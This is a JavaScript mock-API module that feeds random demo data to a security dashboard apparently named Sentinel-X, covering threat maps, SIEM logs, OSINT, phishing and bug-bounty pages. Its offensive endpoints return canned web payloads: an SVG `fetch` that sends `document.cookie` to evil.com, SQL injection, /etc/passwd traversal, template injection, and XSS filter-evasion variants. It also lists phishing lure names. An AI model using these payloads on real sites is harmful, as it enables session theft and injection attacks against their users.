// ── Sentinel-X Mock API — correct field shapes for every page ─────────────────
const R   = () => Math.random()
const rnd = (a, b) => Math.floor(R() * (b - a + 1)) + a
const pick = arr => arr[Math.floor(R() * arr.length)]
const ip   = () => `${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}.${rnd(1,254)}`

const SEV    = ['critical','high','medium','low']
const TYPES  = ['DDoS','SQLi','XSS','RCE','Brute Force','MITM','Ransomware','Phishing','SSRF','LFI']
const COUNTRIES = ['CN','RU','US','BR','IN','KP','IR','DE','FR','UA','NL','PL','VN','ID','TR']

function fakeAttacks(n = 18) {
  const nodes = [
    {lat:39.9,lng:116.4,name:'Beijing',country:'CN'},
    {lat:55.7,lng:37.6, name:'Moscow', country:'RU'},
    {lat:40.7,lng:-74,  name:'New York',country:'US'},
    {lat:-23.5,lng:-46.6,name:'São Paulo',country:'BR'},
    {lat:19.1,lng:72.9, name:'Mumbai', country:'IN'},
    {lat:51.5,lng:-0.1, name:'London', country:'GB'},
    {lat:35.7,lng:139.7,name:'Tokyo',  country:'JP'},
    {lat:52.5,lng:13.4, name:'Berlin', country:'DE'},
    {lat:48.9,lng:2.3,  name:'Paris',  country:'FR'},
    {lat:1.35,lng:103.8,name:'Singapore',country:'SG'},
  ]
  const targets = [
    {lat:37.8,lng:-122.4,name:'SF HQ'},
    {lat:40.7,lng:-74.0, name:'NY DataCenter'},
    {lat:51.5,lng:-0.1,  name:'London Office'},
  ]
  return Array.from({length:n}, (_,i) => ({
    id: i, type: pick(TYPES), severity: pick(SEV),
    source: pick(nodes), target: pick(targets),
    ts: Date.now() - rnd(0,300000), bytes: rnd(1000,99000),
  }))
}

export function getMockResponse(method, url) {
  const M = (method || '').toLowerCase()
  const U = (url  || '').split('?')[0]

  // ── Dashboard ──────────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/dashboard/stats') return {
    threats_blocked_24h:  rnd(800, 4500),
    threats_detected_24h: rnd(200, 1200),
    active_incidents:     rnd(3, 28),
    systems_protected:    rnd(120, 980),
    uptime_pct:           (99 + R()*0.9).toFixed(2),
    global_threat_level:  pick(['LOW','GUARDED','ELEVATED','HIGH','SEVERE']),
    ml_anomalies_today:   rnd(12, 340),
  }

  if (M==='get' && U==='/api/dashboard/timeline') {
    const now = Date.now()
    return {
      timeline: Array.from({length:24}, (_,i) => ({
        hour: `${String(i).padStart(2,'0')}:00`,
        attacks:   rnd(5,80),
        blocked:   rnd(3,75),
        anomalies: rnd(0,20),
      }))
    }
  }

  if (M==='get' && U==='/api/dashboard/threat-distribution') return {
    distribution: [
      {type:'DDoS',       count:rnd(20,50), color:'#ff2d55'},
      {type:'SQLi',       count:rnd(10,30), color:'#ff9f0a'},
      {type:'XSS',        count:rnd(5,20),  color:'#ffd60a'},
      {type:'RCE',        count:rnd(3,15),  color:'#bf5af2'},
      {type:'Brute Force',count:rnd(8,25),  color:'#30d158'},
      {type:'Phishing',   count:rnd(10,25), color:'#0a84ff'},
      {type:'Other',      count:rnd(5,15),  color:'#636366'},
    ]
  }

  if (M==='get' && U.startsWith('/api/defensive/threats/live')) return {
    threats: Array.from({length:8}, () => ({
      id:          Math.random().toString(36).slice(2),
      severity:    pick(SEV),
      description: pick([
        `Port scan detected from ${ip()}`,
        `SQL injection attempt on /api/users`,
        `Brute force attack on SSH from ${ip()}`,
        `Ransomware C2 beacon to ${ip()}`,
        `XSS payload in request from ${ip()}`,
        `Data exfiltration attempt to ${ip()}`,
      ]),
      source_ip:  ip(),
      target_ip:  ip(),
      country:    pick(COUNTRIES),
      confidence: (0.6 + R()*0.4),
      is_blocked: R() > 0.35,
      timestamp:  new Date(Date.now()-rnd(0,600000)).toISOString(),
    }))
  }

  // ── ThreatMap ─────────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/defensive/threats/map') return { attacks: fakeAttacks(20) }

  // ── SIEM Logs ─────────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/defensive/logs/stream') return {
    logs: Array.from({length:50}, (_,i) => ({
      id:        i,
      timestamp: new Date(Date.now()-i*rnd(1000,12000)).toISOString(),
      level:     pick(['ERROR','WARN','INFO','INFO','INFO','DEBUG','CRITICAL']),
      source:    pick(['firewall','ids','auth','proxy','dns','waf','endpoint']),
      src_ip:    ip(),
      message:   pick([
        `Blocked ${pick(TYPES)} attempt from ${ip()}`,
        `Suspicious login from ${ip()} — ${rnd(3,30)} attempts`,
        `Port scan detected from ${ip()}`,
        `Malware signature matched: TROJAN.${rnd(100,999)}`,
        `Outbound C2 traffic to ${ip()}:${rnd(1024,9999)}`,
        `Privilege escalation attempt uid=${rnd(1000,9999)}`,
        `DNS exfil pattern — query length ${rnd(100,250)}`,
      ]),
      rule_id: `RULE-${rnd(1000,9999)}`,
    }))
  }

  // ── Password Lab ──────────────────────────────────────────────────────────
  if (M==='post' && U==='/api/defensive/password/analyze') return {
    score:      rnd(10,100),
    strength:   pick(['Very Weak','Weak','Fair','Strong','Very Strong']),
    entropy:    (R()*80+20).toFixed(1),
    crack_time: pick(['Instantly','3 seconds','2 hours','4 days','12 years','centuries']),
    patterns:   [pick(['common word','keyboard pattern','repeated chars','date pattern'])],
    suggestions:['Add uppercase letters','Use symbols','Increase length to 16+'],
    hibp_count: rnd(0,15000),
  }
  if (M==='post' && U==='/api/defensive/hash/crack') return {
    found:     R() > 0.4,
    plaintext: R() > 0.4 ? pick(['password123','qwerty','admin1234','letmein']) : null,
    algorithm: pick(['MD5','SHA1','SHA256','bcrypt','NTLM']),
    time_ms:   rnd(12,8000),
  }

  // ── JWT ───────────────────────────────────────────────────────────────────
  if (M==='post' && U==='/api/jwt/audit') return {
    header:  {alg:'HS256',typ:'JWT'},
    payload: {sub:'admin',role:'superuser',iat:Math.floor(Date.now()/1000)-3600,exp:Math.floor(Date.now()/1000)+3600},
    issues: [
      {severity:'high',  title:'Weak algorithm HS256',desc:'Consider RS256 or ES256 for production'},
      {severity:'medium',title:'Long expiry',          desc:'Token valid for more than 1 hour'},
      {severity:'info',  title:'Role claim present',  desc:'Ensure role is validated server-side'},
    ],
    alg_none_vulnerable: false,
    rs256_to_hs256:      false,
    signature_valid:     true,
  }
  if (M==='post' && U==='/api/jwt/crack') return {
    cracked:  R() > 0.5,
    secret:   R() > 0.5 ? pick(['secret','password','jwt_secret','mysecret']) : null,
    attempts: rnd(10000,2000000),
    time_ms:  rnd(500,15000),
  }

  // ── OSINT ─────────────────────────────────────────────────────────────────
  if (M==='post' && U==='/api/osint/subdomains') return {
    subdomains: ['api','mail','dev','staging','admin','vpn','cdn','static','auth','portal']
      .map(s => ({subdomain:s, ip:ip(), open_ports:[80,443,rnd(3000,9000)],
        tech:pick(['nginx','apache','cloudflare','fastapi','express']), status:pick(['active','inactive'])})),
    total: 10, scan_time: (R()*8+2).toFixed(1),
  }
  if (M==='post' && U==='/api/osint/email-perms') return {
    email: 'target@example.com', breaches: rnd(0,5),
    breach_list: ['LinkedIn 2021','Adobe 2013','RockYou 2009'].slice(0,rnd(0,3)),
    social: {linkedin:R()>0.5,twitter:R()>0.5,github:R()>0.5},
    mx_records: ['mail1.example.com','mail2.example.com'],
    spf:R()>0.4, dkim:R()>0.5, dmarc:R()>0.6,
  }
  if (M==='post' && U==='/api/osint/github-dorks') return {
    results: Array.from({length:6},(_,i) => ({
      repo:`org/repo-${i+1}`, file:pick(['config.py','.env','secrets.yml','credentials.json']),
      match:pick(['API_KEY=sk-','password=admin','SECRET=','DB_PASS=']),
      url:`https://github.com/org/repo-${i+1}/blob/main/config`, severity:pick(SEV),
    }))
  }
  if (M==='post' && U==='/api/osint/google-dorks') return {
    results: Array.from({length:5},(_,i) => ({
      title:pick(['Admin Panel','Login Page','Config File','Backup Index']),
      url:`https://target.com/${pick(['admin','backup','config','login'])}-${i}`,
      snippet:'Sensitive information found in public index...', dork:pick(['inurl:admin','filetype:sql']),
    }))
  }
  if (M==='post' && U==='/api/osint/breach-check') return {
    breached: R()>0.4, count:rnd(0,8),
    breaches: ['HaveIBeenPwned','LinkedIn 2021','RockYou2021','Adobe 2013'].slice(0,rnd(0,4)),
    first_seen:'2019-03-14', last_seen:'2023-11-02',
  }
  if (M==='post' && U==='/api/osint/password-pwned') return {
    pwned: R()>0.5, count:R()>0.5 ? rnd(1,500000) : 0,
    message: R()>0.5 ? 'Password appeared in data breaches.' : 'Not found in known breaches.',
  }

  // ── Offensive ─────────────────────────────────────────────────────────────
  if (M==='post' && U==='/api/offensive/scan/port') return {
    host:'192.168.1.1', scan_time:(R()*12+3).toFixed(2),
    ports:[
      {port:22,  state:'open',  service:'ssh',   version:'OpenSSH 8.9'},
      {port:80,  state:'open',  service:'http',  version:'nginx 1.24'},
      {port:443, state:'open',  service:'https', version:'nginx 1.24'},
      {port:3306,state:R()>0.5?'open':'filtered',service:'mysql', version:'MySQL 8.0'},
      {port:6379,state:R()>0.5?'open':'closed',  service:'redis', version:'Redis 7.0'},
      {port:8080,state:R()>0.4?'open':'filtered',service:'http-alt',version:'Tomcat 10'},
    ],
    os_guess:pick(['Linux 5.x','Ubuntu 22.04','Windows Server 2022','Debian 11']),
    cves:[`CVE-2023-${rnd(1000,9999)}`,`CVE-2022-${rnd(1000,9999)}`].slice(0,rnd(0,2)),
  }
  if (M==='post' && U==='/api/offensive/scan/web') return {
    url:'https://target.com', scan_time:(R()*20+5).toFixed(2),
    findings:[
      {id:'XSS-001',severity:'high',    title:'Reflected XSS',   path:'/search?q=',     payload:'<script>alert(1)</script>',confidence:'High'},
      {id:'SQLI-001',severity:'critical',title:'SQL Injection',   path:'/api/users?id=', payload:"'OR 1=1--",                confidence:'High'},
      {id:'IDOR-001',severity:'medium',  title:'IDOR',            path:'/api/profile/1', payload:'Change id param',         confidence:'Medium'},
      {id:'CORS-001',severity:'medium',  title:'Misconfigured CORS',path:'/',            payload:'Origin: evil.com',        confidence:'High'},
      {id:'INFO-001',severity:'low',     title:'Server Disclosure',path:'/',             payload:'Server header',           confidence:'High'},
    ].slice(0,rnd(2,5)),
    tech_stack:['nginx','React','FastAPI','PostgreSQL'], waf_detected:R()>0.5,
  }
  if (M==='post' && U==='/api/offensive/payload/generate') return {
    payloads:[
      `<img src=x onerror=alert(document.domain)>`,
      `';DROP TABLE users;--`,
      `../../../../etc/passwd`,
      `{{7*7}}`,
      `<svg onload=fetch('//evil.com/'+document.cookie)>`,
      `admin'--`,
      `%3Cscript%3Ealert(1)%3C/script%3E`,
    ].slice(0,rnd(4,7)),
    technique:'context-aware', encoded_variants:2,
  }

  // ── Phishing ──────────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/phishing/templates') return {
    templates:[
      {id:1,name:'Corporate IT Alert',  category:'credential_harvest',open_rate:'68%'},
      {id:2,name:'Package Delivery',    category:'malware_delivery',   open_rate:'74%'},
      {id:3,name:'DocuSign Request',    category:'credential_harvest', open_rate:'61%'},
      {id:4,name:'Password Expiry',     category:'credential_harvest', open_rate:'82%'},
      {id:5,name:'CEO Wire Transfer',   category:'bec',                open_rate:'45%'},
      {id:6,name:'SharePoint Invite',   category:'credential_harvest', open_rate:'71%'},
    ]
  }
  if (M==='post' && U==='/api/phishing/templates/render') return {
    subject:'Action Required: Verify Your Account',
    html:'<html><body><h2>Security Alert</h2><p>Your account requires verification.</p><a href="#">Verify Now</a></body></html>',
    text:'Security Alert: Your account requires verification.',
    indicators:['urgency','authority','link'],
  }
  if (M==='post' && U==='/api/phishing/analyze/email') return {
    score:  rnd(40,98),
    rating: pick(['PHISHING','SUSPICIOUS','LIKELY_PHISHING','LEGITIMATE']),
    verdict:pick(['PHISHING','SUSPICIOUS','LEGITIMATE']),
    indicators:[
      {type:'spf_fail',        severity:'high',  desc:'SPF check failed for sender domain'},
      {type:'urgency_language',severity:'medium',desc:'Urgency keywords detected'},
      {type:'link_mismatch',   severity:'high',  desc:'Display URL differs from actual href'},
    ].slice(0,rnd(1,3)),
    sender_analysis:{spf:false,dkim:false,dmarc:false,domain_age_days:rnd(1,45)},
    links:[{url:'http://phish.xyz/login',risk:'HIGH',redirects:3}],
  }
  if (M==='post' && (U==='/api/phishing/analyze/url/live' || U.includes('analyze/url'))) return {
    url:'https://target.com',
    score:    rnd(10,95),
    verdict:  pick(['CLEAN','SUSPICIOUS','MALICIOUS']),
    static: {
      risk_score:   rnd(5,90),
      ip:           ip(),
      country:      pick(COUNTRIES),
      registrar:    'GoDaddy LLC',
      domain_age:   rnd(1,3650),
      ssl_valid:    R()>0.5,
      redirects:    rnd(0,5),
    },
    live: {
      runtime_findings: Array.from({length:rnd(0,4)}, () => ({
        type: pick(['popup','form_steal','redirect','crypto_miner']),
        desc: 'Suspicious behaviour detected at runtime',
      })),
      screenshot: null,
      final_url:  'https://target.com/login',
    },
    engines_flagged: rnd(0,45), engines_total:85,
  }
  if (M==='post' && U==='/api/phishing/lookalikes') return {
    domain:'example.com',
    lookalikes:['examp1e.com','exarnple.com','example.co','example-login.com','secure-example.com']
      .map(d => ({domain:d, registered:R()>0.5, ip:R()>0.5?ip():null, risk:pick(['high','medium','low'])})),
  }

  // ── Bug Bounty ───────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/bugbounty/methodology') return {
    phases:[
      {name:'Recon',       tools:['amass','subfinder','shodan'],          duration:'1-2h'},
      {name:'Enumeration', tools:['nmap','gobuster','nikto'],             duration:'2-4h'},
      {name:'Exploitation',tools:['burpsuite','sqlmap','nuclei'],         duration:'4-8h'},
      {name:'Reporting',   tools:['dradis','serpico'],                    duration:'1-2h'},
    ]
  }
  if (M==='get' && U==='/api/bugbounty/vulns') return {
    vulns: Array.from({length:12}, (_,i) => ({
      id:`VULN-${1000+i}`,
      title:pick(['SQL Injection','XSS','IDOR','CSRF','Open Redirect','SSRF','RCE','Path Traversal']),
      severity:pick(SEV), status:pick(['open','triaged','resolved','duplicate']),
      bounty:R()>0.5?`$${rnd(100,15000)}`:'$0',
      program:pick(['HackerOne','Bugcrowd','Intigriti','Private']),
      reported:new Date(Date.now()-rnd(1,90)*86400000).toISOString().split('T')[0],
    }))
  }
  if (M==='get' && U==='/api/bugbounty/platforms') return {
    platforms:[
      {name:'HackerOne', programs:rnd(500,2000),avg_bounty:'$1,250'},
      {name:'Bugcrowd',  programs:rnd(300,1500),avg_bounty:'$950'},
      {name:'Intigriti', programs:rnd(100,800), avg_bounty:'$1,100'},
      {name:'YesWeHack', programs:rnd(50,400),  avg_bounty:'$800'},
    ]
  }
  if (M==='get' && U==='/api/bugbounty/wordlists') return {
    wordlists:[
      {name:'common-dirs',       size:'4.7K',  type:'directory'},
      {name:'api-endpoints',     size:'2.1K',  type:'api'},
      {name:'subdomains-top1m',  size:'1.0M',  type:'subdomain'},
      {name:'params-sqli',       size:'800',   type:'params'},
      {name:'passwords-top10k',  size:'10K',   type:'password'},
    ]
  }
  if (M==='post' && U==='/api/bugbounty/cvss') return {
    score:(R()*10).toFixed(1), severity:pick(SEV),
    vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    breakdown:{attack_vector:'Network',complexity:'Low',privileges:'None',interaction:'None'},
  }
  if (M==='get' && U.startsWith('/api/bugbounty/wordlists/')) return {
    name:U.split('/').pop(),
    words:['admin','backup','api','config','test','dev','staging','secret','uploads','files'],
  }
  if (M==='post' && U==='/api/bugbounty/report') return {
    report_id:`RPT-${rnd(10000,99999)}`,
    markdown:'# Vulnerability Report\n\n## Summary\nCritical SQL injection discovered in `/api/users` endpoint.\n\n## Details\n- **Severity:** Critical\n- **CVSS:** 9.8\n- **Vector:** Network\n\n## Reproduction Steps\n1. Navigate to `/api/users?id=1`\n2. Inject payload: `1 OR 1=1--`\n\n## Impact\nFull database exfiltration possible.\n\n## Remediation\nUse parameterized queries.',
    generated_at:new Date().toISOString(),
  }

  // ── AI Analyst ───────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/ai/provider') return {
    provider:'Demo Mode', model:'sentinel-x-demo', available:false,
    message:'Connect a backend server to enable AI features',
  }
  if (M==='post' && U==='/api/ai/chat') return {
    response:`**[Demo Mode]** AI analysis is available when you connect a real backend.\n\nTo enable GPT-4o powered analysis:\n1. Run your backend: \`uvicorn app.main:app --host 0.0.0.0 --port 8000\`\n2. Set \`OPENAI_API_KEY\` in your \`.env\`\n3. Click the server badge in the sidebar and enter your IP`,
    model:'demo', tokens:80,
  }

  // ── AI Red Team ──────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/ai/redteam/techniques') return {
    techniques:[
      {id:'T1059',name:'Command Scripting', tactic:'Execution',     risk:'critical'},
      {id:'T1078',name:'Valid Accounts',    tactic:'Persistence',   risk:'high'},
      {id:'T1190',name:'Exploit Public App',tactic:'Initial Access',risk:'critical'},
      {id:'T1566',name:'Phishing',          tactic:'Initial Access',risk:'high'},
      {id:'T1055',name:'Process Injection', tactic:'Defense Evasion',risk:'high'},
      {id:'T1041',name:'C2 Exfiltration',   tactic:'Exfiltration',  risk:'critical'},
    ]
  }
  if (M==='post' && U==='/api/ai/redteam/score') return {
    score:rnd(30,95), bypass_rate:(R()*100).toFixed(1)+'%',
    detected_by:rnd(1,12), safe_to_use:R()>0.5,
    analysis:'Payload shows moderate evasion. WAF bypass probability: moderate.',
  }
  if (M==='post' && U==='/api/ai/redteam/mutate') return {
    variants:[
      `<Script>alert(1)</Script>`,
      `<img/src=x onerror=alert(1)>`,
      `%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
      `&#60;script&#62;alert(1)&#60;/script&#62;`,
      `<scr ipt>alert(1)</scr ipt>`,
    ],
    technique:'case-variation + encoding + whitespace',
  }

  // ── MCP Hub ───────────────────────────────────────────────────────────────
  if (M==='get' && U==='/api/mcp/info') return {
    server_name:'Sentinel-X MCP Server', version:'1.3.0',
    status:'demo', protocol:'MCP/1.0', tools_available:24,
  }
  if (M==='get' && U==='/api/mcp/tools') return {
    tools:[
      {name:'osint_lookup',   description:'Recon target IP/domain/email', category:'recon'},
      {name:'port_scan',      description:'TCP/UDP port scanner',          category:'scanning'},
      {name:'payload_gen',    description:'Generate offensive payloads',   category:'exploit'},
      {name:'log_analyze',    description:'AI-powered log analysis',       category:'defense'},
      {name:'threat_intel',   description:'IOC lookup and threat feeds',   category:'intel'},
      {name:'jwt_forge',      description:'JWT token manipulation',        category:'crypto'},
    ]
  }
  if (M==='get' && U==='/api/mcp/config/claude-desktop') return {
    config:JSON.stringify({"mcpServers":{"sentinel-x":{"command":"uvicorn","args":["app.mcp_server:app","--port","8001"]}}}, null, 2)
  }
  if (M==='post' && U.startsWith('/api/mcp/bridge')) return {
    result:'Demo mode — connect backend to run MCP tools live', status:'demo',
  }

  // ── Default fallback ──────────────────────────────────────────────────────
  return { demo:true, message:'Connect your backend server to enable this feature', data:[] }
}

export default getMockResponse
